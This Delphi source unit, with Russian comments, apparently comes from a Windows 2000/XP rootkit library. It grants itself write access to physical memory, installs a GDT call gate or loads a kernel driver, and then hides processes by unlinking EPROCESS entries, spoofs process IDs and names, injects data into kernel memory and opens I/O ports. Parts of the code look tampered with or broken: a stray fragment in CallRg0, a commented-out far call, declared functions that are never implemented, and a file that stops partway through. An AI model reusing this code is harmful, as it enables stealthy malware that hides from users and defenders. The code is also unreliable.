{
 Delphi Ring0 Library.
 Исполнение кода в нулевом кольце,
 работа с процессами и памятью ядра.
 Coded By Ms-Rem ( [email=Ms-Rem@yandex.ru]Ms-Rem@yandex.ru[/email] ) ICQ 286370715  
}
unit Ring0;
interface
uses
 Windows,
 NativeApi;
type
TPROCESS = packed record
   ProcessId : dword;
   ImageName : array [0..15] of Char;
   pEPROCESS : dword;
   ParrentPid: dword;
   end;
PSYS_PROCESSES = ^TSYS_PROCESSES;
TSYS_PROCESSES = packed record
  ProcessesCount: dword;
  Process: array[0..0] of TPROCESS;
  end;

const
CALL_GATE   = 0;
DRIVER_GATE = 1;
function OpenPhysicalMemory(mAccess: dword): THandle;
function QuasiMmGetPhysicalAddress(VirtualAddress: dword;
                                  var Offset: dword): dword;
Procedure CallRing0(const Ring0Proc: pointer; Param: pointer);
function GetKernelModuleAddress(pModuleName: PChar): dword;
Function GetPhysicalAddress(VirtualAddress: dword): LARGE_INTEGER; stdcall;
function MapVirtualMemory(vAddress: pointer; Size: dword): pointer;
Procedure Ring0CopyMemory(Source, Destination: pointer; Size: dword);
Function GetKernelProcAddress(lpProcName: PChar): dword;
function GetSystemEPROCESS(): dword;
function InitialzeRing0Library(Ring0GateType: dword): boolean;
Procedure FreeRing0Library();
Function GetEPROCESSAdr(ProcessId: dword): dword;
Procedure HideProcessEx(pEPROCESS: dword);
function HideProcess(ProcessId: dword): dword;
Procedure FreeSystemMemory(Mem: dword);
Procedure ShowProcess(pEPROCESS: dword);
function GetProcesses(): PSYS_PROCESSES;
function InjectDataToSystemMemory(Mem: pointer; Size: dword): dword;
Procedure ChangeProcessIdEx(pEPROCESS: dword; NewPid: dword);
Procedure ChangeProcessId(OldPid: dword; NewPid: dword);
Procedure ChangeProcessNameEx(pEPROCESS: dword; NewName: PChar);
Procedure ChangeProcessName(ProcessId: dword; NewName: PChar);
Procedure SetIoAccessMap(pMap: pointer);
Procedure GetIoAccessMap(pMap: pointer);
Procedure SetIoAccessProcessEx(pEPROCESS: dword; Access: boolean);
Procedure SetIoAccessProcess(ProcessId: dword; Access: boolean);
Procedure OpenPort(Port: dword; CanOpen: boolean);
Procedure DisableHDD();
Procedure FastReboot();

implementation
type
 PFarCall = ^TFarCall;
 TFarCall = packed record
   Offset: DWORD;
   Selector: Word;
 end;
 
 TGDTInfo = packed record
   Limit: Word;
   Base: DWORD;
 end;
 PGateDescriptor = ^TGateDescriptor;
 TGateDescriptor = packed record
   OffsetLo: Word;   // нижние 2 байта адреса
   Selector: Word;   // кодовый селектор (определяет привилегии)
   Attributes: Word; // атрибуты шлюза
   OffsetHi: Word;   // верхние 2 байта адреса
 end;
 PR0DriverQuery = ^TR0DriverQuery;
 TR0DriverQuery = packed record
   QueryType: dword;
   Param1: dword;
   Param2: dword;
   Param3: dword;
   end;
 TRUSTEE_A = packed record
   pMultipleTrustee: pointer;
   MultipleTrusteeOperation: dword;
   TrusteeForm: dword;
   TrusteeType: dword;
   ptstrName: PAnsiChar;
 end;
 PEXPLICIT_ACCESS = ^EXPLICIT_ACCESS;
 EXPLICIT_ACCESS = packed record
   grfAccessPermissions: DWORD;
   grfAccessMode: dword;
   grfInheritance: DWORD;
   Trustee: TRUSTEE_A;
 end;
function GetSecurityInfo(handle: THandle; ObjectType: dword;
                        SecurityInfo: SECURITY_INFORMATION;
                        ppsidOwner, ppsidGroup: ppointer;
                        ppDacl, ppSacl: pointer;
                        var ppSecurityDescriptor: PSECURITY_DESCRIPTOR): DWORD;
                           stdcall; external 'advapi32.dll';
function SetEntriesInAclA(cCountOfExplicitEntries: ULONG;
                         pListOfExplicitEntries: PEXPLICIT_ACCESS;
                         OldAcl: PACL; var NewAcl: PACL): DWORD;
                           stdcall; external 'advapi32.dll';
function SetSecurityInfo(handle: THandle; ObjectType: dword;
                        SecurityInfo: SECURITY_INFORMATION;
                        ppsidOwner, ppsidGroup: ppointer;
                        ppDacl, ppSacl: PACL): DWORD;
                           stdcall; external 'advapi32.dll';

const
KernelName = 'ntoskrnl.exe';
MemDeviceName: PWideChar = '\Device\PhysicalMemory';
Driver = '\registry\machine\system\CurrentControlSet\Services\KernelPort';
SE_KERNEL_OBJECT    = 6;
GRANT_ACCESS        = 1;
NO_MULTIPLE_TRUSTEE = 0;
TRUSTEE_IS_NAME     = 1;
TRUSTEE_IS_USER     = 1;
NO_INHERITANCE      = 0;
var
FarCall: TFarCall;
CurrentGate: PGateDescriptor;
OldGate: TGateDescriptor;
ptrGDT: Pointer;       
Ring0ProcAdr: pointer; // текущий указатель на код подлежащий вызову через шлюз.
AdrMmGetPhys: dword;   // GetPhysicalAddress
AdrMmIsValid: dword;   // MmIsAddressValid
AdrIoGetCurr: dword;   // IoGetCurrentProcess
AdrSetIoAccess: dword; // Ke386SetIoAccessMap
AdrGetIoAccess: dword; // Ke386GetIoAccessMap
AdrSetAccProc: dword;  // Ke386IoSetAccessProcess
AdrExAllocPool: dword; // ExAllocatePool
AdrExFreePool: dword;  // ExFreePool
GateType: dword;
KernelBase : dword;    // адрес ядра в памяти
dKernelBase: dword;    // адрес ядра подгруженного в User Space
hPhysMem: dword;       // хэндл секции \Device\PhysicalMemory
hDriver: dword;

UndocData : packed record
        {00} BaseProcStrAdr    : dword; // адрес первой EPROCESS
        {04} ActivePsListOffset: dword; // смещение ActivePsList в EPROCESS
        {08} PidOffset: dword;          // смещение ProcessID в EPROCESS
        {0C} NameOffset: dword;         // смещение ImageName в EPROCESS
        {10} ppIdOffset: dword;         // смещение ParrentPid в EPROCESS
        {14} ImgNameOffset: dword;      // смещение ImageFileName в EPROCESS
            end;
{ перезагрузка регистра FS и вызов Ring0 кода  } 
procedure Ring0CallProc;
asm
cli
pushad
pushfd
mov di, $30
mov fs, di
call Ring0ProcAdr
mov di, $3B
mov fs, di
popfd
popad
sti
retf
end;
Procedure SendDriverRequest(ReqType, Param1, Param2: dword);
var
Query: TR0DriverQuery;
Written: dword;
begin
Query.QueryType := ReqType;
Query.Param1    := Param1;
Query.Param2    := Param2;
WriteFile(hDriver, Query, SizeOf(TR0DriverQuery), Written, nil);
end;
{ Открытие физической памяти }
function OpenPhysicalMemory(mAccess: dword): THandle;
var
 PhysMemString: TUnicodeString;
 Attr: TObjectAttributes;
 OldAcl, NewAcl: PACL;
 SD: PSECURITY_DESCRIPTOR;
 Access: EXPLICIT_ACCESS;
 mHandle: dword;
begin
 Result := 0;
 RtlInitUnicodeString(@PhysMemString, MemDeviceName);
 InitializeObjectAttributes(@Attr, @PhysMemString, OBJ_CASE_INSENSITIVE or
                            OBJ_KERNEL_HANDLE, 0, nil);
 if ZwOpenSection(@mHandle, READ_CONTROL or
                  WRITE_DAC , @Attr) <> STATUS_SUCCESS then Exit;
 if GetSecurityInfo(mHandle, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION,
                    nil, nil, @OldAcl, nil, SD) <> ERROR_SUCCESS then Exit;
 with Access do
   begin
    grfAccessPermissions := mAccess;
    grfAccessMode := GRANT_ACCESS;
    grfInheritance := NO_INHERITANCE;
    Trustee.pMultipleTrustee := nil;
    Trustee.MultipleTrusteeOperation := NO_MULTIPLE_TRUSTEE;
    Trustee.TrusteeForm := TRUSTEE_IS_NAME;
    Trustee.TrusteeType := TRUSTEE_IS_USER;
    Trustee.ptstrName := 'CURRENT_USER';
   end;
  SetEntriesInAclA(1, @Access, OldAcl, NewAcl);
  SetSecurityInfo(mHandle , SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION,
                  nil, nil, NewAcl, nil);
  ZwOpenSection(@Result, mAccess, @Attr);
  SetSecurityInfo(mHandle , SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION,
                  nil, nil, OldAcl, nil);
  CloseHandle(mHandle);
  LocalFree(DWORD(NewAcl));
  LocalFree(DWORD(SD));
end;

{
 Получение физического адреса из виртуального.
 Действительно только для Nonpaged Memory. 
}
function QuasiMmGetPhysicalAddress(VirtualAddress: dword;
                                  var Offset: dword): dword;
begin
 Offset := VirtualAddress and $FFF;
 if (VirtualAddress > $80000000) and (VirtualAddress < $A0000000) then
   Result := VirtualAddress and $1ffff000
   else Result := VirtualAddress and $fff000;
end;

{ установка калгейта }
Function InstallCallgate(hPhysMem: dword): boolean;
var
 gdt: TGDTInfo;
 offset, base_address: DWORD;
begin
 Result := false;
 if hPhysMem = 0 then Exit;
 asm sgdt [gdt] end;
 base_address := QuasiMmGetPhysicalAddress(gdt.Base, offset);
 ptrGDT := MapViewOfFile(hPhysMem, FILE_MAP_READ or FILE_MAP_WRITE,
                         0, base_address, gdt.limit + offset);
 if ptrGDT = nil then Exit;
 CurrentGate := PGateDescriptor(DWORD(ptrGDT) + offset);
 repeat
   CurrentGate := PGateDescriptor(DWORD(CurrentGate) + SizeOf(TGateDescriptor));
   if (CurrentGate.Attributes and $FF00) = 0 then
     begin
       OldGate := CurrentGate^;
       CurrentGate.Selector   := $08; // ring0 code selector
       CurrentGate.OffsetLo   := DWORD(@Ring0CallProc);
       CurrentGate.OffsetHi   := DWORD(@Ring0CallProc) shr 16;
       CurrentGate.Attributes := $EC00;
       FarCall.Offset   := 0;
       FarCall.Selector := DWORD(CurrentGate) - DWORD(ptrGDT) - offset;
       Break;
     end;
 until DWORD(CurrentGate) >= DWORD(ptrGDT) + gdt.limit + offset;
 FlushViewOfFile(CurrentGate, SizeOf(TGateDescriptor));
 Result := true;
end;
{ удаление каллгейта }
Procedure UninstallCallgate();
begin
 CurrentGate^ := OldGate;
 UnmapViewOfFile(ptrGDT);
end;

procedure CallRg0(Ring0Func:pointer);
const
ExceptionUsed = 5;
var
 IDT       : array [0..7] of byte;
 lpOldGate : dword;
asm
 push eax
 mov eax, [eax + $04]
 push eax
 test eax, eax
 jz @Exit
 pop eax
 mov ebx, [eax]        //UndocAdr
 mov ecx, [eax + $04]  //pEPROCESS
 add esi, $04
 //mov edi, [ecx + esi]  //ActivePsList.Blink
 mov [edx + $04], edi  //ActivePsList.Flink.Blink = ActivePsList.Blink
 @Exit:
 pop eax
 ret
end;

{ Вызов процедуры с переходом в 0 кольцо. }
Procedure CallRing0(const Ring0Proc: pointer; Param: pointer);
begin
case GateType of
  CALL_GATE : asm
               mov eax, Ring0Proc
               mov Ring0ProcAdr, eax
               mov eax, Param
               lea eax, FarCall
               //db $0ff, $01d      // call far [FarCall]
               //dd offset FarCall; //
              end;
  DRIVER_GATE : SendDriverRequest(0, dword(Ring0Proc), dword(Param));
end; 
end;

{
 Получение виртуального адреса для модуля
 загруженного в системное адресное пространство.
}
function GetKernelModuleAddress(pModuleName: PChar): dword;
var
Info: PSYSTEM_MODULE_INFORMATION_EX;
R: dword;
begin
 Result := 0; 
 Info := GetInfoTable(SystemModuleInformation);
 for r := 0 to Info^.ModulesCount do
  if lstrcmpi(PChar(dword(@Info^.Modules[r].ImageName)
                    + Info^.Modules[r].ModuleNameOffset), pModuleName) = 0 then
      begin
       Result := dword(Info^.Modules[r].Base);
       break;
      end;
 VirtualFree(Info, 0, MEM_RELEASE);
end;

{
 Получение физического адреса по виртуальному.
 Действительно для любых регионов памяти.
}
Function GetPhysicalAddress(VirtualAddress: dword): LARGE_INTEGER; stdcall;
var
Data : packed record
  VirtualAddress: dword;
  Result: LARGE_INTEGER;
  end;
Procedure Ring0Call;
asm
 mov ebx, [eax]
 push ebx
 mov esi, eax
 call AdrMmGetPhys
 mov  [esi + $04], eax
 mov  [esi + $08], edx
 ret
end;
begin
 Data.VirtualAddress := VirtualAddress;
 CallRing0(@Ring0Call, @Data);
 Result.QuadPart := Data.Result.QuadPart;
end;

{
 Отображение участка виртуальной памяти в
 текушем процессе через физическую память.
}
function MapVirtualMemory(vAddress: pointer; Size: dword): pointer;
var
MappedAddress: LARGE_INTEGER;
begin
 Result := nil;
 MappedAddress := GetPhysicalAddress(dword(vAddress));
 if MappedAddress.QuadPart = 0 then Exit;
 Result := MapViewOfFile(hPhysMem, FILE_MAP_READ or FILE_MAP_WRITE,
                         0, MappedAddress.LowPart, Size);
end;

{
 Копирование участка памяти из 0 кольца.
 Можно работать с памятью ядра.
 ВНИМАНИЕ! некорректная запись в память ядра приведет к падению системы!
}
Procedure Ring0CopyMemory(Source, Destination: pointer; Size: dword);
var
Data : packed record
   Src: pointer;
   Dst: pointer;
   Size: dword;
  end;
Procedure Ring0Call;
asm
 //проверка адресов
 mov ebx, eax
 mov eax, [ebx]
 push eax
 call AdrMmIsValid
 test eax, eax
 jz @Exit
 mov eax, [ebx]
 add eax, [ebx + $08]
 push eax
 call AdrMmIsValid
 test eax, eax
 jz @Exit
 mov eax, [ebx + $04]
 push eax
 call AdrMmIsValid
 test eax, eax
 jz @Exit
 mov eax, [ebx + $04]
 add eax, [ebx + $08]
 push eax
 call AdrMmIsValid
 test eax, eax
 jz @Exit
 //копирование
 mov esi, [ebx]
 mov edi, [ebx + $04]
 mov ecx, [ebx + $08]
 rep movsb
 @Exit:
 ret
end;
begin
Data.Src  := Source;
Data.Dst  := Destination;
Data.Size := Size;
VirtualLock(Source, Size);
VirtualLock(Destination, Size);
CallRing0(@Ring0Call, @Data);
VirtualUnlock(Source, Size);
VirtualUnlock(Destination, Size);
end;

{ Получение адреса ядерной API в системном адресном пространстве. }
Function GetKernelProcAddress(lpProcName: PChar): dword;
var
uProc: dword;
begin
uProc  := dword(GetProcAddress(dKernelBase, lpProcName));
if uProc > 0 then Result := (uProc - dKernelBase) + KernelBase
   else Result := 0;
end;
{ получение указателя на структуру EPROCESS для System }
function GetSystemEPROCESS(): dword;
var
Data: packed record
       UndocAdr: pointer;
       Result: dword;
      end;
      
procedure Ring0Call;
asm
 mov ebx, eax
 call AdrIoGetCurr
 mov edx, [ebx]       // UndocAdr
 mov esi, [edx + $04] // ActivePsListOffset
 mov edi, [edx + $10] // pPidOffset
 @Find:
 mov ecx, [eax + edi]
 test ecx, ecx
 jz @Found
 mov eax, [eax + esi]
 sub eax, esi
 jmp @Find
 @Found:
 mov [ebx + $04], eax
 ret
end;
begin
Data.UndocAdr := @UndocData;
CallRing0(@Ring0Call, @Data);
Result := Data.Result;
end;
{ создание записи о драйвере в реестре. }
Procedure InstallDriver();
var
Key, Key2: HKEY;
Pth: PChar;
dType: dword;
Image: array [0..MAX_PATH] of Char;
begin
lstrcpy(Image, '\??\');
GetFullPathName('Ring0Port.sys', MAX_PATH, PChar(dword(@Image) + 4), Pth);
dType := 1;
RegOpenKey(HKEY_LOCAL_MACHINE, 'system\CurrentControlSet\Services', Key);
RegCreateKey(Key, 'KernelPort', Key2);
RegSetValueEx(Key2, 'ImagePath', 0, REG_SZ, @Image, lstrlen(Image));
RegSetValueEx(Key2, 'Type', 0, REG_DWORD, @dType, SizeOf(dword));
RegCloseKey(Key2);
RegCloseKey(Key);
end;
{ удалние из реестра записи о драйвере. }
Procedure UninstallDriver();
var
Key: HKEY;
begin
RegOpenKey(HKEY_LOCAL_MACHINE, 'system\CurrentControlSet\Services', Key);
RegDeleteKey(Key, 'KernelPort');
RegCloseKey(Key);
end;
{ загрузка драйвера и открытие его устройства. }
Function OpenDriver(): THandle;
var
Image: TUnicodeString;
begin
InstallDriver();
RtlInitUnicodeString(@Image, Driver);
ZwLoadDriver(@Image);
Result := CreateFile('\\.\Ring0Port', GENERIC_WRITE, 0,
                      nil, OPEN_EXISTING, 0, 0);
end;
{ открытие памяти и установка калгейта. }
Function InitializeCallGate(): boolean;
begin
Result := false;
hPhysMem := OpenPhysicalMemory(SECTION_MAP_READ or SECTION_MAP_WRITE);
if hPhysMem = 0 then Exit;
Result := InstallCallgate(hPhysMem);
end;

function InitializeDriverGate(): boolean;
begin
 hDriver := OpenDriver();
 Result := hDriver <> INVALID_HANDLE_VALUE;
end;

{ Инициализация Ring0 библиотеки. }
function InitialzeRing0Library(Ring0GateType: dword): boolean;
var
Version: TOSVersionInfo;
begin
Result := false;
Version.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
GetVersionEx(Version);
if Version.dwMajorVersion <> 5 then Exit;
case Version.dwBuildNumber of
2195 : begin // Windows 2000
        UndocData.ActivePsListOffset := $0A0;
        UndocData.PidOffset          := $09C;
        UndocData.NameOffset         := $1FC;
        UndocData.ppIdOffset         := $1C8;
        UndocData.ImgNameOffset      := $000;
       end;
2600 : begin // Windows XP
        UndocData.ActivePsListOffset := $088;
        UndocData.PidOffset          := $084;
        UndocData.NameOffset         := $174;
        UndocData.ppIdOffset         := $14C;
        UndocData.ImgNameOffset      := $1F4;
       end;
else Exit;
end;
KernelBase     := GetKernelModuleAddress(KernelName);
dKernelBase    := LoadLibraryEx(KernelName, 0, DONT_RESOLVE_DLL_REFERENCES);
AdrMmGetPhys   := GetKernelProcAddress('MmGetPhysicalAddress');
AdrMmIsValid   := GetKernelProcAddress('MmIsAddressValid');
AdrIoGetCurr   := GetKernelProcAddress('IoGetCurrentProcess');
AdrSetIoAccess := GetKernelProcAddress('Ke386SetIoAccessMap');
AdrGetIoAccess := GetKernelProcAddress('Ke386QueryIoAccessMap');
AdrSetAccProc  := GetKernelProcAddress('Ke386IoSetAccessProcess');
AdrExAllocPool := GetKernelProcAddress('ExAllocatePool');
AdrExFreePool  := GetKernelProcAddress('ExFreePool');
GateType := Ring0GateType;
case GateType of
  CALL_GATE   : Result := InitializeCallGate();                   
  DRIVER_GATE : Result := InitializeDriverGate();
end;
if Result then UndocData.BaseProcStrAdr := GetSystemEPROCESS();
end;
Procedure FreeDriver();
var
Image: TUnicodeString;
begin
CloseHandle(hDriver);
RtlInitUnicodeString(@Image, Driver);
ZwUnloadDriver(@Image);
UninstallDriver();
end;

{ Освобождение ресурсов библиотеки }
Procedure FreeRing0Library();
begin
case GateType of
  CALL_GATE   : begin
                 UninstallCallgate();
                 CloseHandle(hPhysMem);
                end;
  DRIVER_GATE : FreeDriver();
end;
FreeLibrary(dKernelBase);
end;

{
 Получение по ProcessId указателя на струкруру ядра EPROCESS
 связанную с данным процессом.
}
Function GetEPROCESSAdr(ProcessId: dword): dword;
var
Data: packed record
       UndocAdr: pointer;
       ProcessId: dword;
       Result: dword;
      end;
procedure Ring0Call;
asm
 mov ebx, [eax]         //UndocAdr
 mov ecx, [eax + $04]   //ProcessId
 push eax
 mov eax, [ebx]         //BaseProcStrAdr
 mov esi, [ebx + $04]   //ActivePsListOffset
 mov edi, [ebx + $08]   //PidOffset
 @Find:
 mov edx, [eax + edi]   //ActivePs.Pid
 cmp edx, ecx           //compare process id
 jz @Found
 mov eax, [eax + esi]   // ActivePsList.Flink
 sub eax, esi           //sub ActivePsListOffset
 cmp eax, [ebx]         //final
 jz @End
 jmp @Find
 @Found:
 pop edx
 mov [edx + $08], eax   //save result
 ret
 @End:
 pop edx
 mov [edx + $08], 0
 ret
end;
begin
Data.UndocAdr  := @UndocData;
Data.ProcessId := ProcessId;
CallRing0(@Ring0Call, @Data);
CallRg0(@Ring0Call);
Result := Data.Result;
end;

{
 Скрытие процесса по указателю на структуру ядра EPROCESS.
 Неправильный указатель может привести к краху системы!
}
Procedure HideProcessEx(pEPROCESS: dword);
var
Data: packed record
       UndocAdr: pointer;
       pEPROCESS: dword;
      end;
Procedure Ring0Call;
asm
 push eax
 mov eax, [eax + $04]
 push eax
 call AdrMmIsValid
 test eax, eax
 jz @Exit
 pop eax
 mov ebx, [eax]        //UndocAdr
 mov ecx, [eax + $04]  //pEPROCESS
 mov esi, [ebx + $04]  //ActivePsListOffset
 mov edx, [ecx + esi]  //ActivePsList.Flink
 add esi, $04
 mov edi, [ecx + esi]  //ActivePsList.Blink
 mov [edx + $04], edi  //ActivePsList.Flink.Blink = ActivePsList.Blink
 mov [edi], edx        //ActivePsList.Blink.Flink = ActivePsList.Flink
 ret
 @Exit:
 pop eax
 ret
end;

begin
if pEPROCESS = 0 then Exit;
Data.UndocAdr  := @UndocData;
Data.pEPROCESS := pEPROCESS;
CallRing0(@Ring0Call, @Data);
end;

{
 Скрытие процесса по ProcessId.
 В случае удачи возвращает указатель на EPROCESS, иначе 0.
}
function HideProcess(ProcessId: dword): dword;
var
OldPriority: dword;
begin
OldPriority := GetThreadPriority($FFFFFFFE);
SetThreadPriority($FFFFFFFE, THREAD_PRIORITY_TIME_CRITICAL);
Result := GetEPROCESSAdr(ProcessId);
HideProcessEx(Result);
SetThreadPriority($FFFFFFFE, OldPriority);
end;

{ Восстановление процесса в списке процессов по указателю на  EPROCESS. }
Procedure ShowProcess(pEPROCESS: dword);
var
Data: packed record
       UndocAdr: pointer;
       pEPROCESS: dword;
      end;
Procedure Ring0Call;
asm
 push eax
 mov eax, [eax + $04]
 push eax
 call AdrMmIsValid
 test eax, eax
 jz @Exit
 pop eax 
 mov ebx, [eax]        //UndocAdr
 mov ecx, [eax + $04]  //pEPROCESS
 mov esi, [ebx + $04]  //ActivePsListOffset
 mov edx, [ebx]        //BaseProcStrAdr
 add edx, esi          //@BaseProcStrAdr.Flink
 add ecx, esi          //@pEPROCESS.Flink
 mov [ecx + $04], edx  //pEPROCESS.Blink = @BaseProcStrAdr.Flink
 mov eax, [edx]        //@BaseProcStrAdr.Flink.Flink
 mov [ecx], eax        //pEPROCESS.Flink = @BaseProcStrAdr.Flink.Flink
 mov [edx], ecx        //BaseProcStrAdr.Flink = @pEPROCESS.Flink
 ret
 @Exit:
 pop eax
 ret
end;

begin
if pEPROCESS = 0 then Exit;
Data.UndocAdr  := @UndocData;
Data.pEPROCESS := pEPROCESS;
CallRing0(@Ring0Call, @Data);
end;
{ Получение списка процессов прямым доступом к структурам ядра. }
function GetProcesses(): PSYS_PROCESSES;
var
Eprocess: array [0..$600] of byte;
CurrentStruct: dword;
CurrSize: dword;
OldPriority: dword;
begin
CurrSize := SizeOf(TSYS_PROCESSES);
GetMem(Result, CurrSize);
ZeroMemory(Result, CurrSize);
ZeroMemory(@Eprocess, $600);
CurrentStruct := UndocData.BaseProcStrAdr + UndocData.ActivePsListOffset;
OldPriority := GetThreadPriority($FFFFFFFE);
SetThreadPriority($FFFFFFFE, THREAD_PRIORITY_TIME_CRITICAL);
repeat
 CurrentStruct := CurrentStruct - UndocData.ActivePsListOffset;
 Ring0CopyMemory(pointer(CurrentStruct), @Eprocess, $220);
 if pdword(dword(@Eprocess) + UndocData.ppIdOffset)^ > 0 then
    begin
     Inc(CurrSize, SizeOf(TPROCESS));
     ReallocMem(Result, CurrSize);
     Result^.Process[Result^.ProcessesCount].ProcessId :=
                               pdword(dword(@Eprocess) + UndocData.PidOffset)^;
     Result^.Process[Result^.ProcessesCount].pEPROCESS := CurrentStruct;
     lstrcpyn(@Result^.Process[Result^.ProcessesCount].ImageName,
             PChar(dword(@Eprocess) + UndocData.NameOffset), 16);
     Result^.Process[Result^.ProcessesCount].ParrentPid :=
                               pdword(dword(@Eprocess) + UndocData.ppIdOffset)^;
     Inc(Result^.ProcessesCount);
    end;
 CurrentStruct := pdword(dword(@Eprocess) + UndocData.ActivePsListOffset)^;
 if CurrentStruct < $80000000 then break;
until CurrentStruct = UndocData.BaseProcStrAdr + UndocData.ActivePsListOffset;
SetThreadPriority($FFFFFFFE, OldPriority);
end;
{ Смена Id процесса по указателю на EPROCESS. }
Procedure ChangeProcessIdEx(pEPROCESS: dword; NewPid: dword);
var
Data: packed record
       UndocAdr: pointer;
       pEPROCESS: dword;
       NewId: dword;
      end;
Procedure Ring0Call;
asm
 push eax
 mov eax, [eax + $04]
 push eax
 call AdrMmIsValid
 test eax, eax
 jz @Exit
 pop eax
 mov ebx,   [eax]    
 mov esi,   [eax + $04] // pEPROCESS
 add esi,   [ebx + $08] // @pEPROCESS.ProcessId
 mov eax,   [eax + $08] // NewId
 mov [esi], eax
 ret
 @Exit:
 pop eax
 ret
end;

begin
if pEPROCESS = 0 then Exit;
Data.UndocAdr  := @UndocData;
Data.pEPROCESS := pEPROCESS;
Data.NewId     := NewPid;
CallRing0(@Ring0Call, @Data);
end;
{ Смена Id процесса. }
Procedure ChangeProcessId(OldPid: dword; NewPid: dword);
var
OldPriority: dword;
pEPROCESS  : dword;
begin
OldPriority := GetThreadPriority($FFFFFFFE);
SetThreadPriority($FFFFFFFE, THREAD_PRIORITY_TIME_CRITICAL);
pEPROCESS := GetEPROCESSAdr(OldPid);
ChangeProcessIdEx(pEPROCESS, NewPid);
SetThreadPriority($FFFFFFFE, OldPriority);
end;
{
 Смена имени процесса по указателю на его EPROCESS.
}
Procedure ChangeProcessNameEx(pEPROCESS: dword; NewName: PChar);
var
Data: packed record
     {00} UndocAdr: pointer;
     {04} pEPROCESS: dword;
     {08} NewName:    array [0..15] of Char;
     {18} UnicName:   array [0..15] of WideChar;
     {38} UnicLength: word;
         end;
Procedure Ring0Call;
asm
 push eax
 mov eax, [eax + $04]
 push eax
 call AdrMmIsValid
 test eax, eax
 jz @Exit
 pop eax
 mov ebx, [eax]        //UndocAdr
 mov edi, [eax + $04]  //pEPROCESS
 add edi, [ebx + $0C]  //NameOffset
 mov esi, eax
 add esi, $08
 mov ecx, $10
 repnz movsb
 mov esi, eax
 add esi, $18
 mov edx, [eax + $04]  //pEPROCESS
 mov ebp, [eax]
 mov ebp, [ebp + $14]
 add edx, ebp          //@IamgeFileName
 mov ebp, eax
 mov edx, [edx]
 test edx, edx
 jz  @Done
 movzx ecx, word ptr [edx] 
 test ecx, ecx
 jz  @Done
 mov edi, dword ptr [edx + $04] 
 add edi, ecx
 mov edx, edi
 std
 mov eax, '\'
 shr ecx, 1
 repne scasw
 or ecx, ecx
 jz @Done
 add edi, $04
 lea esi, [ebp + $18]
 movzx ecx, word ptr [ebp + $38]
 cld
 rep movsw
 mov edx, [ebp + $04]  //pEPROCESS
 mov ebp, [ebp]
 mov ebp, [ebp + $14]
 add edx, ebp         //@IamgeFileName
 mov edx, [edx]
 mov word ptr [edx], cx
 @Done:
 ret
 @Exit:
 pop eax
 ret
end;
begin
if pEPROCESS = 0 then Exit;
Data.UndocAdr  := @UndocData;
Data.pEPROCESS := pEPROCESS;
lstrcpyn(Data.NewName, NewName, 16);
StringToWideChar(NewName, @Data.UnicName, 16);
Data.UnicLength := lstrlen(NewName);
CallRing0(@Ring0Call, @Data);
end;
{ Смена имени процесса. }
Procedure ChangeProcessName(ProcessId: dword; NewName: PChar);
var
OldPriority: dword;
pEPROCESS  : dword;
begin
OldPriority := GetThreadPriority($FFFFFFFE);
SetThreadPriority($FFFFFFFE, THREAD_PRIORITY_TIME_CRITICAL);
pEPROCESS := GetEPROCESSAdr(ProcessId);
ChangeProcessNameEx(pEPROCESS, NewName);
SetThreadPriority($FFFFFFFE, OldPriority);
end;
{
 Выделение участка памяти в NonPaged Pool и копирование в него данных.
 Mem - адрес участка памяти,
 Size - размер участка памяти,
 Result - адрес памяти в SystemSpace
}
function InjectDataToSystemMemory(Mem: pointer; Size: dword): dword;
var
Data: packed record
          Mem:    pointer;
          Size:   dword;
          Result: dword;
         end;
Procedure Ring0Call;
asm
 mov ebx, eax
 push [eax]
 call AdrMmIsValid
 test eax, eax
 jz @Exit
 push [ebx + $04]
 push 0
 call AdrExAllocPool
 mov [ebx + $08], eax
 mov edi, eax
 mov esi, [ebx]
 mov ecx, [ebx + $04]
 rep movsb
 ret
 @Exit:
 mov [ebx + $08], 0
 ret
end;
begin
 Data.Mem  := Mem;
 Data.Size := Size;
 CallRing0(@Ring0Call, @Data);
 Result := Data.Result;
end;
{
 Освобождение выделенной памяти в SystemSpace.
}
Procedure FreeSystemMemory(Mem: dword);
 Procedure Ring0Call;
 asm
  push eax
  call AdrExFreePool
 end;
begin
 if Mem < $80000000 then Exit;
 CallRing0(@Ring0Call, pointer(Mem));
end;

{
Установка системной карты ввода - вывода
pMap - адрес буфера размером $2000 откуда будет взята карта.
}
Procedure SetIoAccessMap(pMap: pointer);
Procedure Ring0Call;
asm
 push eax
 push 1
 call AdrSetIoAccess
 ret
end;
begin
CallRing0(@Ring0Call, pMap);
end;

{
 Получение системной карты ввода - вывода.
 pMap - адрес буфера размером $2000 куда будет сохранена карта.
}
Procedure GetIoAccessMap(pMap: pointer);
Procedure Ring0Call;
asm
 push eax
 push 1
 call AdrGetIoAccess
 ret
end;
begin
CallRing0(@Ring0Call, pMap);
end;
{ Разрешение / запркщение использования карты ввода - вывода для процесса. }
Procedure SetIoAccessProcessEx(pEPROCESS: dword; Access: boolean);
var
Data : packed record
         pEPROCESS: dword;
         Access: dword;
       end;
Procedure Ring0Call;
asm
 mov ebx, [eax + $04]
 push ebx
 mov eax, [eax]
 push eax
 call AdrSetAccProc
 ret
end;
begin
Data.pEPROCESS := pEPROCESS;
if Access then Data.Access := 1 else Data.Access := 0;
CallRing0(@Ring0Call, @Data);
end;
{ Разрешить / запретить использование карты в/в для процесса }
Procedure SetIoAccessProcess(ProcessId: dword; Access: boolean);
var
OldPriority: dword;
pEPROCESS  : dword;
begin
OldPriority := GetThreadPriority($FFFFFFFE);
SetThreadPriority($FFFFFFFE, THREAD_PRIORITY_TIME_CRITICAL);
pEPROCESS := GetEPROCESSAdr(ProcessId);
if pEPROCESS = 0 then Exit;
SetIoAccessProcessEx(pEPROCESS, Access);
SetThreadPriority($FFFFFFFE, OldPriority);
end;
{ Открытие / закрытие доступа к порту в/в для разрешенных процессов. }
Procedure OpenPort(Port: dword; CanOpen: boolean);
var
Iopm: array [0..$2000] of Byte;
pIopm: pointer;
bNum: dword;
bOffset: dword;
begin
pIopm := @Iopm;
GetIoAccessMap(pIopm);
bNum := Port div 8;
bOffset := Port mod 8;
if CanOpen then
 asm
  mov ecx, pIopm
  add ecx, bNum
  mov eax, [ecx]
  mov edx, bOffset
  btr eax, edx
  mov [ecx], eax
 end else
 asm
  mov ecx, pIopm
  add ecx, bNum
  mov eax, [ecx]
  mov edx, bOffset
  bts eax, edx
  mov [ecx], eax
 end;
